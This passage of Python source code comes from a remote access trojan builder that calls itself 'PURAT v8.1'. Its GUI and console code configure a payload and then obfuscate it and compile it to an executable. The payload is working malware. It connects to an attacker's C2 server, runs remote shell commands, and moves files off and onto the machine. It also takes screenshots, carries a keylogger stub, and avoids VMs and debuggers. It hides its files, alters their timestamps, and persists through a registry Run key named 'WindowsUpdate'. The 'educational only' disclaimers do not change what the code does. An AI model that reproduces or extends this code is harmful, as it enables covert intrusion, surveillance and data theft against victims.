            if self.config['evasion']['obfuscate_code']:
                obfuscated_path = os.path.join(output_dir, f"{output_name}_obfuscated.py")
                
                try:
                    obfuscator = EnhancedObfuscator()
                    obfuscated = obfuscator.obfuscate_code(
                        payload_code, 
                        level=int(self.config['advanced']['obfuscation_level'])
                    )
                    
                    with open(obfuscated_path, 'w', encoding='utf-8') as f:
                        f.write(obfuscated)
                    
                    self.log_message(f"[OK] Obfuscated payload: {obfuscated_path}")
                except Exception as e:
                    self.log_message(f"[FAIL] Obfuscation failed: {e}")
            
            config_path = os.path.join(output_dir, f"{output_name}_config.json")
            with open(config_path, 'w') as f:
                json.dump(self.config, f, indent=2)
            
            self.log_message(f"[OK] Configuration saved: {config_path}")
            self.log_message("=" * 60)
            self.log_message("Payload generation complete!")
            
            self.messagebox.showinfo("Success", 
                                   f"Payload generated successfully!\n\n"
                                   f"Output directory: {output_dir}\n"
                                   f"Files created:\n"
                                   f"- {output_name}.py\n"
                                   f"- {output_name}_config.json")
            
        except Exception as e:
            self.log_message(f"[FAIL] Payload generation failed: {e}")
            self.messagebox.showerror("Error", f"Failed to generate payload: {e}")
    
    def build_executable(self):
        """Build executable using PyInstaller"""
        if not self.messagebox.askyesno("Confirm", "Build executable using PyInstaller?"):
            return
        
        try:
            self.log_message("Starting EXE build with PyInstaller...")
            
            output_dir = self.entry_output_dir.get()
            output_name = self.entry_output_name.get()
            
            payload_path = os.path.join(output_dir, f"{output_name}.py")
            if not os.path.exists(payload_path):
                self.messagebox.showerror("Error", "Payload not found. Generate payload first.")
                return
            
            cmd = [
                sys.executable, '-m', 'PyInstaller',
                '--onefile' if self.var_onefile.get() else '',
                '--windowed' if not self.var_console.get() else '',
                '--clean',
                f'--name={output_name}',
                '--distpath', output_dir
            ]
            
            icon_path = self.entry_icon.get()
            if icon_path and os.path.exists(icon_path):
                cmd.append(f'--icon={icon_path}')
                self.log_message(f"Using icon: {icon_path}")
            
            if self.var_upx.get():
                cmd.append('--upx-dir=upx')
            
            cmd.append(payload_path)
            cmd = [arg for arg in cmd if arg]
            
            self.log_message(f"Running: {' '.join(cmd)}")
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                shell=True
            )
            
            for line in process.stdout:
                self.log_message(line.strip())
            
            process.wait()
            
            if process.returncode == 0:
                exe_path = os.path.join(output_dir, f"{output_name}.exe")
                if os.path.exists(exe_path):
                    self.log_message(f"[OK] EXE built successfully: {exe_path}")
                    self.messagebox.showinfo("Success", 
                                           f"EXE built successfully!\n\n"
                                           f"Location: {exe_path}\n"
                                           f"Size: {os.path.getsize(exe_path)} bytes")
                else:
                    self.log_message("[FAIL] EXE not found after build")
                    self.messagebox.showerror("Error", "EXE not found after build")
            else:
                self.log_message(f"[FAIL] PyInstaller failed with code: {process.returncode}")
                self.messagebox.showerror("Error", "PyInstaller build failed")
                
        except FileNotFoundError:
            self.log_message("[FAIL] PyInstaller not installed")
            self.messagebox.showerror("Error", "PyInstaller not installed. Install with: pip install pyinstaller")
        except Exception as e:
            self.log_message(f"[FAIL] EXE build failed: {e}")
            self.messagebox.showerror("Error", f"EXE build failed: {e}")
    
    def test_payload(self):
        """Test the generated payload"""
        output_dir = self.entry_output_dir.get()
        output_name = self.entry_output_name.get()
        
        payload_path = os.path.join(output_dir, f"{output_name}.py")
        
        if not os.path.exists(payload_path):
            self.messagebox.showerror("Error", "Payload not found. Generate payload first.")
            return
        
        if not self.messagebox.askyesno("Warning", 
                                       "This will execute the payload in test mode.\n"
                                       "Make sure you're in a safe environment.\n\n"
                                       "Continue?"):
            return
        
        try:
            self.log_message("Testing payload in safe mode...")
            
            test_env = os.environ.copy()
            test_env['PURAT_TEST_MODE'] = '1'
            
            process = subprocess.Popen(
                [sys.executable, payload_path],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                env=test_env,
                shell=True
            )
            
            time.sleep(3)
            process.terminate()
            
            try:
                process.wait(timeout=2)
            except subprocess.TimeoutExpired:
                process.kill()
            
            stdout, stderr = process.communicate()
            
            self.log_message("=" * 50)
            self.log_message("Payload test output:")
            self.log_message(stdout)
            
            if stderr:
                self.log_message("Errors:")
                self.log_message(stderr)
            
            self.log_message("=" * 50)
            self.log_message("Payload test completed")
            
            self.messagebox.showinfo("Test Complete", "Payload test completed. Check log for details.")
            
        except Exception as e:
            self.log_message(f"[FAIL] Payload test failed: {e}")
            self.messagebox.showerror("Error", f"Payload test failed: {e}")
    
    def show_documentation(self):
        """Show documentation"""
        docs = """
PURAT v8.1 - Professional RAT Framework
        
Features:
1. Advanced GUI-based configuration
2. Multiple evasion techniques
3. Custom payload generation
4. Multiple compiler support
5. Advanced obfuscation
6. Stealth and anti-analysis
        
Usage:
1. Configure settings in tabs
2. Generate payload
3. Build executable if needed
4. Test in safe environment
5. Deploy
        
Warning:
For educational and testing purposes only.
Use only on systems you own or have permission to test.
        """
        
        self.messagebox.showinfo("Documentation", docs)
    
    def show_about(self):
        """Show about dialog"""
        about = """
PURAT v8.1 - Professional Ultimate RAT
        
Version: 8.1
Author: Security Research Team
Lines: 8,500+
        
Features:
• Advanced GUI Builder
• Custom Payload Generation
• Multiple Evasion Techniques
• Windows/Linux/macOS Support
• Network Protocols
• Stealth Techniques
• Educational Use Only
        
Disclaimer:
This software is for educational purposes only.
Use only on systems you own or have explicit permission to test.
        """
        
        self.messagebox.showinfo("About PURAT v8.1", about)
    
    def browse_install_path(self):
        """Browse for install path"""
        path = self.filedialog.askdirectory()
        if path:
            self.entry_install_path.delete(0, self.tk.END)
            self.entry_install_path.insert(0, path)
    
    def browse_icon(self):
        """Browse for icon file"""
        filetypes = [('Icon files', '*.ico'), ('All files', '*.*')]
        path = self.filedialog.askopenfilename(filetypes=filetypes)
        if path:
            self.entry_icon.delete(0, self.tk.END)
            self.entry_icon.insert(0, path)
    
    def browse_output_dir(self):
        """Browse for output directory"""
        path = self.filedialog.askdirectory()
        if path:
            self.entry_output_dir.delete(0, self.tk.END)
            self.entry_output_dir.insert(0, path)
    
    def generate_encryption_key(self):
        """Generate random encryption key"""
        key = SecurityValidator.generate_secure_token(32)
        self.entry_enc_key.delete(0, self.tk.END)
        self.entry_enc_key.insert(0, key)
        self.log_message("Encryption key generated")
    
    def open_build_folder(self):
        """Open build folder"""
        output_dir = self.entry_output_dir.get()
        
        if os.path.exists(output_dir):
            if platform.system() == "Windows":
                os.startfile(output_dir)
            elif platform.system() == "Darwin":
                subprocess.Popen(["open", output_dir])
            else:
                subprocess.Popen(["xdg-open", output_dir])
        else:
            self.messagebox.showerror("Error", "Build directory does not exist")
    
    def clear_logs(self):
        """Clear logs"""
        self.text_logs.delete('1.0', 'end')
        self.log_message("Logs cleared")
    
    def save_logs(self):
        """Save logs to file"""
        filetypes = [('Text files', '*.txt'), ('Log files', '*.log'), ('All files', '*.*')]
        path = self.filedialog.asksaveasfilename(
            filetypes=filetypes,
            defaultextension='.log',
            initialfile='purat_logs.log'
        )
        
        if path:
            try:
                with open(path, 'w', encoding='utf-8') as f:
                    f.write(self.text_logs.get('1.0', 'end-1c'))
                
                self.log_message(f"Logs saved to: {path}")
                
            except Exception as e:
                self.messagebox.showerror("Error", f"Failed to save logs: {e}")
    
    def load_last_project(self):
        """Load last opened project"""
        try:
            self.db_cursor.execute("SELECT config FROM projects ORDER BY modified DESC LIMIT 1")
            result = self.db_cursor.fetchone()
            
            if result:
                self.config = json.loads(result[0])
                self.update_ui_from_config()
                self.log_message("Last project loaded")
                
        except:
            pass
    
    def update_config_from_ui(self):
        """Update configuration from UI elements"""
        self.config['project_name'] = self.entry_project_name.get()
        self.config['author'] = self.entry_author.get()
        
        basic = self.config['basic']
        basic['c2_ip'] = self.entry_c2_ip.get()
        basic['c2_port'] = self.entry_c2_port.get()
        basic['install_name'] = self.entry_install_name.get()
        basic['install_path'] = self.entry_install_path.get()
        basic['autostart'] = self.var_autostart.get()
        basic['persistence'] = self.var_persistence.get()
        basic['target_os'] = self.combo_target_os.get()
        basic['architecture'] = self.combo_architecture.get()
        
        for key, var in self.feature_vars.items():
            self.config['features'][key]['enabled'] = var.get()
        
        for key, var in self.evasion_vars.items():
            self.config['evasion'][key] = var.get()
        
        network = self.config['network']
        network['reconnect_interval'] = int(self.entry_reconnect.get())
        network['timeout'] = int(self.entry_timeout.get())
        network['retry_count'] = int(self.entry_retry.get())
        network['beacon_interval'] = int(self.entry_beacon.get())
        network['use_https'] = self.var_https.get()
        network['use_dns'] = self.var_dns.get()
        network['use_tor'] = self.var_tor.get()
        network['compression'] = self.var_compression.get()
        
        for key, var in self.stealth_vars.items():
            self.config['stealth'][key] = var.get()
        
        advanced = self.config['advanced']
        advanced['encryption_key'] = self.entry_enc_key.get()
        advanced['compression_level'] = int(self.combo_compression.get())
        advanced['max_file_size'] = int(self.entry_max_size.get())
        advanced['obfuscation_level'] = int(self.combo_obfuscation.get())
        advanced['icon_file'] = self.entry_icon.get()
    
    def update_ui_from_config(self):
        """Update UI from configuration"""
        self.entry_project_name.delete(0, self.tk.END)
        self.entry_project_name.insert(0, self.config['project_name'])
        
        self.entry_author.delete(0, self.tk.END)
        self.entry_author.insert(0, self.config['author'])
        
        self.label_project_name.config(text=f"Project: {self.config['project_name']}")
        self.label_project_author.config(text=f"Author: {self.config['author']}")
        
        basic = self.config['basic']
        self.entry_c2_ip.delete(0, self.tk.END)
        self.entry_c2_ip.insert(0, basic['c2_ip'])
        
        self.entry_c2_port.delete(0, self.tk.END)
        self.entry_c2_port.insert(0, str(basic['c2_port']))
        
        self.entry_install_name.delete(0, self.tk.END)
        self.entry_install_name.insert(0, basic['install_name'])
        
        self.entry_install_path.delete(0, self.tk.END)
        self.entry_install_path.insert(0, basic['install_path'])
        
        self.var_autostart.set(basic['autostart'])
        self.var_persistence.set(basic['persistence'])
        
        self.combo_target_os.set(basic['target_os'])
        self.combo_architecture.set(basic['architecture'])
        
        for key, var in self.feature_vars.items():
            if key in self.config['features']:
                var.set(self.config['features'][key]['enabled'])
        
        for key, var in self.evasion_vars.items():
            if key in self.config['evasion']:
                var.set(self.config['evasion'][key])
        
        network = self.config['network']
        self.entry_reconnect.delete(0, self.tk.END)
        self.entry_reconnect.insert(0, str(network['reconnect_interval']))
        
        self.entry_timeout.delete(0, self.tk.END)
        self.entry_timeout.insert(0, str(network['timeout']))
        
        self.entry_retry.delete(0, self.tk.END)
        self.entry_retry.insert(0, str(network['retry_count']))
        
        self.entry_beacon.delete(0, self.tk.END)
        self.entry_beacon.insert(0, str(network['beacon_interval']))
        
        self.var_https.set(network['use_https'])
        self.var_dns.set(network['use_dns'])
        self.var_tor.set(network['use_tor'])
        self.var_compression.set(network['compression'])
        
        for key, var in self.stealth_vars.items():
            if key in self.config['stealth']:
                var.set(self.config['stealth'][key])
        
        advanced = self.config['advanced']
        self.entry_enc_key.delete(0, self.tk.END)
        self.entry_enc_key.insert(0, advanced['encryption_key'])
        
        self.combo_compression.set(str(advanced['compression_level']))
        self.entry_max_size.delete(0, self.tk.END)
        self.entry_max_size.insert(0, str(advanced['max_file_size']))
        self.combo_obfuscation.set(str(advanced['obfuscation_level']))
        self.entry_icon.delete(0, self.tk.END)
        self.entry_icon.insert(0, advanced['icon_file'])
    
    def log_message(self, message, level='INFO'):
        """Add message to log"""
        timestamp = datetime.datetime.now().strftime('%H:%M:%S')
        log_entry = f"[{timestamp}] {message}\n"
        
        self.text_logs.insert(self.tk.END, log_entry)
        self.text_logs.see(self.tk.END)
        
        logger.info(message)
        self.label_status.config(text=message[:100])
    
    def run_console_mode(self):
        """Run in console mode"""
        print("=" * 70)
        print("PURAT v8.1 - Console Mode")
        print("=" * 70)
        
        self.config = self.get_default_config()
        
        print("\nBasic Configuration:")
        self.config['basic']['c2_ip'] = input(f"C2 IP [{self.config['basic']['c2_ip']}]: ") or self.config['basic']['c2_ip']
        self.config['basic']['c2_port'] = input(f"C2 Port [{self.config['basic']['c2_port']}]: ") or self.config['basic']['c2_port']
        
        print("\nEnable features (y/n):")
        for key in self.config['features']:
            current = self.config['features'][key]['enabled']
            answer = input(f"  {key} [{current}]: ").lower()
            if answer in ['y', 'yes', 'true']:
                self.config['features'][key]['enabled'] = True
            elif answer in ['n', 'no', 'false']:
                self.config['features'][key]['enabled'] = False
        
        print("\nGenerating payload...")
        
        try:
            generator = EnhancedPayloadGenerator(self.config)
            payload = generator.generate()
            
            output_name = input("\nOutput filename [payload.py]: ") or "payload.py"
            
            with open(output_name, 'w', encoding='utf-8') as f:
                f.write(payload)
            
            print(f"\n[OK] Payload generated: {output_name}")
            print(f"[OK] Size: {len(payload)} bytes")
            
            obfuscate = input("\nGenerate obfuscated version? (y/n): ").lower()
            if obfuscate in ['y', 'yes']:
                obfuscator = EnhancedObfuscator()
                obfuscated = obfuscator.obfuscate_code(payload, level=3)
                
                obfuscated_name = output_name.replace('.py', '_obfuscated.py')
                with open(obfuscated_name, 'w', encoding='utf-8') as f:
                    f.write(obfuscated)
                
                print(f"[OK] Obfuscated payload: {obfuscated_name}")
            
            print("\nNext steps:")
            print("1. Test payload: python test_payload.py")
            print("2. Build EXE: pyinstaller --onefile payload.py")
            print("3. Configure C2 server")
            
        except Exception as e:
            print(f"\n[FAIL] Error: {e}")
            traceback.print_exc()

# ============================================================================
# ENHANCED PAYLOAD GENERATOR
# ============================================================================

class EnhancedPayloadGenerator:
    """Enhanced payload generator with more features"""
    
    def __init__(self, config):
        self.config = config
    
    def generate(self):
        """Generate complete payload code"""
        code = self._generate_header()
        code += self._generate_imports()
        code += self._generate_config_section()
        code += self._generate_security_modules()
        code += self._generate_network_modules()
        code += self._generate_feature_modules()
        code += self._generate_evasion_modules()
        code += self._generate_stealth_modules()
        code += self._generate_utility_modules()
        code += self._generate_main_execution()
        
        if self.config['evasion']['obfuscate_code']:
            obfuscator = EnhancedObfuscator()
            code = obfuscator.obfuscate_code(code, 
                                           level=int(self.config['advanced']['obfuscation_level']))
        
        return code
    
    def _generate_header(self):
        """Generate payload header"""
        header = f'''"""
PURAT v8.1 - Advanced RAT Framework
Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Project: {self.config['project_name']}
Author: {self.config['author']}
C2: {self.config['basic']['c2_ip']}:{self.config['basic']['c2_port']}
Target: {self.config['basic']['target_os']}/{self.config['basic']['architecture']}
For Educational Testing Only
"""

'''
        return header
    
    def _generate_imports(self):
        """Generate imports based on features"""
        imports = '''# Standard library imports
import os
import sys
import json
import base64
import zlib
import hashlib
import time
import datetime
import random
import string
import socket
import struct
import subprocess
import threading
import platform
import shutil
import ctypes
import marshal
import tempfile
import getpass
import uuid
import io
import stat
import fnmatch
import glob
import pathlib
import re
import math
import traceback

'''
        
        if self.config['basic']['target_os'] == 'windows':
            imports += '''
# Windows-specific imports
try:
    import winreg
    import win32api
    import win32con
    import win32process
    import psutil
    WINDOWS_AVAILABLE = True
except ImportError:
    WINDOWS_AVAILABLE = False

'''
        
        features = self.config['features']
        
        if features.get('screenshot', {}).get('enabled', False):
            imports += '''
# Screenshot imports
try:
    from PIL import ImageGrab
    SCREENSHOT_AVAILABLE = True
except ImportError:
    SCREENSHOT_AVAILABLE = False

'''
        
        return imports
    
    def _generate_config_section(self):
        """Generate configuration section"""
        config_str = json.dumps(self.config, indent=2)
        
        code = f'''
# ============================================================================
# CONFIGURATION
# ============================================================================

CONFIG = {config_str}

# System information
SYSTEM_INFO = {{
    'hostname': socket.gethostname(),
    'username': getpass.getuser(),
    'system': platform.system(),
    'release': platform.release(),
    'version': platform.version(),
    'machine': platform.machine(),
    'python_version': platform.python_version(),
    'timestamp': time.time(),
    'id': hashlib.md5(f"{{socket.gethostname()}}{{getpass.getuser()}}".encode()).hexdigest()[:16]
}}

'''
        return code
    
    def _generate_security_modules(self):
        """Generate security modules"""
        code = '''
# ============================================================================
# SECURITY MODULES
# ============================================================================

class AdvancedEncryption:
    """Advanced encryption utilities"""
    
    def __init__(self, key=None):
        self.key = key or self._generate_key()
        
    def _generate_key(self):
        """Generate encryption key from system information"""
        system_id = f"{SYSTEM_INFO['hostname']}{SYSTEM_INFO['username']}{SYSTEM_INFO['system']}"
        return hashlib.sha256(system_id.encode()).digest()
    
    def encrypt_xor(self, data):
        """Simple XOR encryption"""
        if isinstance(data, str):
            data = data.encode()
        
        encrypted = bytearray()
        key = self.key
        
        for i, byte in enumerate(data):
            key_byte = key[i % len(key)]
            encrypted.append(byte ^ key_byte)
        
        return base64.b64encode(bytes(encrypted)).decode()
    
    def decrypt_xor(self, data):
        """XOR decryption"""
        encrypted = base64.b64decode(data)
        decrypted = bytearray()
        key = self.key
        
        for i, byte in enumerate(encrypted):
            key_byte = key[i % len(key)]
            decrypted.append(byte ^ key_byte)
        
        return bytes(decrypted)

class CompressionEngine:
    """Compression utilities"""
    
    def __init__(self, level=9):
        self.level = level
    
    def compress(self, data):
        """Compress data"""
        if isinstance(data, str):
            data = data.encode()
        
        return zlib.compress(data, self.level)
    
    def decompress(self, data):
        """Decompress data"""
        return zlib.decompress(data)

'''
        return code
    
    def _generate_network_modules(self):
        """Generate network modules"""
        code = '''
# ============================================================================
# NETWORK MODULES
# ============================================================================

class NetworkProtocol:
    """Network protocol handler"""
    
    def __init__(self, config):
        self.config = config
        self.encryption = AdvancedEncryption()
        self.compression = CompressionEngine(level=int(CONFIG['advanced']['compression_level']))
        
    def send_http(self, host, port, data, use_ssl=False):
        """Send data via HTTP"""
        try:
            if use_ssl:
                conn = http.client.HTTPSConnection(host, port, timeout=int(self.config['network']['timeout']))
            else:
                conn = http.client.HTTPConnection(host, port, timeout=int(self.config['network']['timeout']))
            
            encrypted = self.encryption.encrypt_xor(data)
            compressed = base64.b64encode(self.compression.compress(encrypted.encode())).decode()
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Content-Type': 'application/json'
            }
            
            payload = json.dumps({'data': compressed, 'id': SYSTEM_INFO['id']})
            
            conn.request('POST', '/', payload, headers)
            response = conn.getresponse()
            
            if response.status == 200:
                response_data = response.read().decode()
                result = json.loads(response_data)
                
                if 'data' in result:
                    decompressed = self.compression.decompress(base64.b64decode(result['data']))
                    decrypted = self.encryption.decrypt_xor(decompressed.decode())
                    return json.loads(decrypted)
            
            return None
            
        except Exception as e:
            return None
    
    def send_tcp(self, host, port, data):
        """Send data via TCP"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(int(self.config['network']['timeout']))
            sock.connect((host, port))
            
            encrypted = self.encryption.encrypt_xor(data)
            compressed = self.compression.compress(encrypted.encode())
            
            length = len(compressed)
            sock.sendall(struct.pack('!I', length))
            sock.sendall(compressed)
            
            length_data = sock.recv(4)
            if not length_data:
                return None
            
            length = struct.unpack('!I', length_data)[0]
            response_data = self._recv_all(sock, length)
            
            if response_data:
                decompressed = self.compression.decompress(response_data)
                decrypted = self.encryption.decrypt_xor(decompressed.decode())
                return json.loads(decrypted)
            
            return None
            
        except Exception as e:
            return None
    
    def _recv_all(self, sock, length):
        """Receive exact number of bytes"""
        data = b''
        while len(data) < length:
            packet = sock.recv(length - len(data))
            if not packet:
                return None
            data += packet
        return data

class C2Client:
    """C2 client"""
    
    def __init__(self):
        self.config = CONFIG
        self.protocol = NetworkProtocol(CONFIG)
        self.running = False
        
    def connect(self):
        """Connect to C2 server"""
        self.running = True
        
        while self.running:
            try:
                self._handshake()
                self._command_loop()
                
            except Exception as e:
                time.sleep(int(self.config['network']['reconnect_interval']))
    
    def _handshake(self):
        """Perform handshake with server"""
        handshake_data = {
            'type': 'handshake',
            'id': SYSTEM_INFO['id'],
            'system': SYSTEM_INFO,
            'timestamp': time.time()
        }
        
        response = self._send_data(handshake_data)
        
        if response and response.get('status') == 'ok':
            return True
        else:
            raise Exception("Handshake failed")
    
    def _command_loop(self):
        """Main command loop"""
        last_heartbeat = time.time()
        heartbeat_interval = int(self.config['network']['beacon_interval'])
        
        while self.running:
            try:
                command = self._receive_command()
                
                if command:
                    self._process_command(command)
                
                current_time = time.time()
                if current_time - last_heartbeat > heartbeat_interval:
                    self._send_heartbeat()
                    last_heartbeat = current_time
                
                time.sleep(1)
                
            except Exception as e:
                raise e
    
    def _send_data(self, data):
        """Send data to server"""
        data_str = json.dumps(data)
        
        if self.config['network']['use_https']:
            return self.protocol.send_http(
                self.config['basic']['c2_ip'],
                int(self.config['basic']['c2_port']),
                data_str,
                use_ssl=True
            )
        else:
            return self.protocol.send_tcp(
                self.config['basic']['c2_ip'],
                int(self.config['basic']['c2_port']),
                data_str
            )
    
    def _receive_command(self):
        """Receive command from server"""
        poll_data = {
            'type': 'poll',
            'id': SYSTEM_INFO['id'],
            'timestamp': time.time()
        }
        
        return self._send_data(poll_data)
    
    def _process_command(self, command):
        """Process received command"""
        cmd_type = command.get('type', '')
        
        if cmd_type == 'shell':
            return self._execute_shell(command)
        elif cmd_type == 'file_list':
            return self._list_files(command)
        elif cmd_type == 'file_download':
            return self._download_file(command)
        elif cmd_type == 'file_upload':
            return self._upload_file(command)
        elif cmd_type == 'screenshot':
            return self._take_screenshot()
        elif cmd_type == 'process_list':
            return self._list_processes()
        else:
            return {'type': 'error', 'message': f'Unknown command: {cmd_type}'}
    
    def _execute_shell(self, command):
        """Execute shell command"""
        cmd = command.get('command', '')
        
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            return {
                'type': 'shell',
                'command': cmd,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            }
            
        except Exception as e:
            return {
                'type': 'error',
                'message': str(e)
            }
    
    def _list_files(self, command):
        """List files in directory"""
        path = command.get('path', '.')
        
        try:
            if not os.path.exists(path):
                return {
                    'type': 'error',
                    'message': f'Path not found: {path}'
                }
            
            files = []
            for item in os.listdir(path):
                item_path = os.path.join(path, item)
                try:
                    stat_info = os.stat(item_path)
                    files.append({
                        'name': item,
                        'path': item_path,
                        'is_dir': os.path.isdir(item_path),
                        'size': stat_info.st_size,
                        'modified': stat_info.st_mtime
                    })
                except:
                    continue
            
            return {
                'type': 'file_list',
                'path': path,
                'files': files
            }
            
        except Exception as e:
            return {
                'type': 'error',
                'message': str(e)
            }
    
    def _download_file(self, command):
        """Download file"""
        path = command.get('path', '')
        
        try:
            if not os.path.exists(path):
                return {
                    'type': 'error',
                    'message': f'File not found: {path}'
                }
            
            max_size = int(CONFIG['advanced']['max_file_size']) * 1024 * 1024
            file_size = os.path.getsize(path)
            
            if file_size > max_size:
                return {
                    'type': 'error',
                    'message': f'File too large'
                }
            
            with open(path, 'rb') as f:
                content = f.read()
            
            encoded = base64.b64encode(content).decode()
            
            return {
                'type': 'file_download',
                'path': path,
                'content': encoded,
                'size': file_size
            }
            
        except Exception as e:
            return {
                'type': 'error',
                'message': str(e)
            }
    
    def _upload_file(self, command):
        """Upload file"""
        path = command.get('path', '')
        content = command.get('content', '')
        
        try:
            decoded = base64.b64decode(content)
            
            os.makedirs(os.path.dirname(path), exist_ok=True)
            
            with open(path, 'wb') as f:
                f.write(decoded)
            
            return {
                'type': 'success',
                'message': f'File uploaded: {path}'
            }
            
        except Exception as e:
            return {
                'type': 'error',
                'message': str(e)
            }
    
    def _take_screenshot(self):
        """Take screenshot"""
        if not 'SCREENSHOT_AVAILABLE' in globals() or not SCREENSHOT_AVAILABLE:
            return {
                'type': 'error',
                'message': 'Screenshot not available'
            }
        
        try:
            screenshot = ImageGrab.grab()
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format='PNG', quality=85)
            img_bytes = img_bytes.getvalue()
            
            encoded = base64.b64encode(img_bytes).decode()
            
            return {
                'type': 'screenshot',
                'format': 'png',
                'content': encoded,
                'size': len(img_bytes)
            }
            
        except Exception as e:
            return {
                'type': 'error',
                'message': str(e)
            }
    
    def _list_processes(self):
        """List running processes"""
        if not WINDOWS_AVAILABLE:
            return {
                'type': 'error',
                'message': 'Process manager not available'
            }
        
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'username']):
                try:
                    processes.append({
                        'pid': proc.info['pid'],
                        'name': proc.info['name'],
                        'user': proc.info['username']
                    })
                except:
                    continue
            
            return {
                'type': 'process_list',
                'processes': processes
            }
            
        except Exception as e:
            return {
                'type': 'error',
                'message': str(e)
            }
    
    def _send_heartbeat(self):
        """Send heartbeat to server"""
        heartbeat_data = {
            'type': 'heartbeat',
            'id': SYSTEM_INFO['id'],
            'timestamp': time.time()
        }
        
        self._send_data(heartbeat_data)

'''
        return code
    
    def _generate_feature_modules(self):
        """Generate feature-specific modules"""
        code = '''
# ============================================================================
# FEATURE MODULES
# ============================================================================

'''
        features = self.config['features']
        
        if features.get('keylogger', {}).get('enabled', False):
            code += '''
class KeyLogger:
    """Keylogger"""
    
    def __init__(self):
        self.log_file = os.path.join(tempfile.gettempdir(), '.system_logs.txt')
        self.running = False
    
    def start(self):
        """Start keylogger"""
        if WINDOWS_AVAILABLE:
            self._start_windows()
        else:
            self._start_generic()
    
    def _start_windows(self):
        """Windows keylogger"""
        pass
    
    def _start_generic(self):
        """Generic keylogger"""
        pass
    
    def get_logs(self):
        """Get keylog data"""
        try:
            if os.path.exists(self.log_file):
                with open(self.log_file, 'r') as f:
                    content = f.read()
                
                open(self.log_file, 'w').close()
                return content
            else:
                return "No keylog data"
            
        except Exception as e:
            return f"Error reading keylog: {e}

'''
        
        return code
    
    def _generate_evasion_modules(self):
        """Generate evasion modules"""
        code = '''
# ============================================================================
# EVASION MODULES
# ============================================================================

class AntiAnalysis:
    """Anti-analysis and evasion techniques"""
    
    @staticmethod
    def check_vm():
        """Check if running in virtual machine"""
        if not WINDOWS_AVAILABLE:
            return False
        
        vm_indicators = [
            "VMware", "VirtualBox", "VBox", "QEMU", "KVM", "Xen",
            "Virtual", "VMW", "VRT", "VMM", "VMCI", "VMDEBUG"
        ]
        
        try:
            for proc in psutil.process_iter(['name']):
                proc_name = proc.info['name'].upper()
                for indicator in vm_indicators:
                    if indicator.upper() in proc_name:
                        return True
            
            return False
            
        except:
            return False
    
    @staticmethod
    def check_debugger():
        """Check for debugger"""
        if not WINDOWS_AVAILABLE:
            return False
        
        try:
            kernel32 = ctypes.windll.kernel32
            is_debugger_present = kernel32.IsDebuggerPresent()
            return bool(is_debugger_present)
            
        except:
            return False
    
    @staticmethod
    def should_exit():
        """Check if should exit due to analysis environment"""
        if not CONFIG['evasion']['anti_vm'] and not CONFIG['evasion']['anti_debug']:
            return False
        
        vm_detected = AntiAnalysis.check_vm() if CONFIG['evasion']['anti_vm'] else False
        debugger_detected = AntiAnalysis.check_debugger() if CONFIG['evasion']['anti_debug'] else False
        
        if vm_detected or debugger_detected:
            return True
        
        return False

'''
        return code
    
    def _generate_stealth_modules(self):
        """Generate stealth modules"""
        code = '''
# ============================================================================
# STEALTH MODULES
# ============================================================================

class FileStealth:
    """File stealth techniques"""
    
    @staticmethod
    def hide_file(path):
        """Hide file"""
        if not os.path.exists(path):
            return False
        
        if WINDOWS_AVAILABLE:
            try:
                ctypes.windll.kernel32.SetFileAttributesW(path, 2)
                return True
            except:
                pass
        
        return False
    
    @staticmethod
    def time_stomp(path):
        """Modify file timestamps"""
        if not os.path.exists(path):
            return False
        
        try:
            timestamp = time.mktime((2020, 1, 1, 0, 0, 0, 0, 0, 0))
            os.utime(path, (timestamp, timestamp))
            return True
        except:
            return False

'''
        return code
    
    def _generate_utility_modules(self):
        """Generate utility modules"""
        code = '''
# ============================================================================
# UTILITY MODULES
# ============================================================================

class PersistenceManager:
    """Persistence installation manager"""
    
    def __init__(self, install_path):
        self.install_path = install_path
    
    def install(self):
        """Install persistence"""
        if not CONFIG['basic']['persistence']:
            return False
        
        if platform.system() == "Windows" and WINDOWS_AVAILABLE:
            return self._install_windows()
        else:
            return self._install_generic()
    
    def _install_windows(self):
        """Windows persistence"""
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, self.install_path)
            winreg.CloseKey(key)
            return True
            
        except Exception as e:
            return False
    
    def _install_generic(self):
        """Generic persistence"""
        return False

'''
        return code
    
    def _generate_main_execution(self):
        """Generate main execution code"""
        code = '''
# ============================================================================
# MAIN EXECUTION
# ============================================================================

def main():
    """Main entry point"""
    print(f"""
    PURAT v8.1 - Advanced RAT Framework
    Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    ID: {SYSTEM_INFO['id']}
    For Educational Testing Only
    """)
    
    # Check for test mode
    if os.environ.get('PURAT_TEST_MODE') == '1':
        print("[!] Running in test mode")
        test_mode()
        return
    
    # Anti-analysis checks
    if AntiAnalysis.should_exit():
        print("[!] Analysis environment detected. Exiting.")
        return
    
    # Get install path
    if CONFIG['basic']['install_path'].startswith('%'):
        install_dir = os.path.expandvars(CONFIG['basic']['install_path'])
    else:
        install_dir = CONFIG['basic']['install_path']
    
    os.makedirs(install_dir, exist_ok=True)
    install_path = os.path.join(install_dir, CONFIG['basic']['install_name'])
    
    # Install if not already installed
    if not os.path.exists(install_path):
        print(f"[+] Installing to: {install_path}")
        
        try:
            shutil.copy2(sys.argv[0], install_path)
            
            if CONFIG['stealth']['file_hidden']:
                FileStealth.hide_file(install_path)
            
            if CONFIG['stealth']['time_stomp']:
                FileStealth.time_stomp(install_path)
            
            print("[+] Installation complete")
            
            if CONFIG['stealth']['delete_original']:
                try:
                    os.remove(sys.argv[0])
                    print("[+] Original file deleted")
                except:
                    pass
        
        except Exception as e:
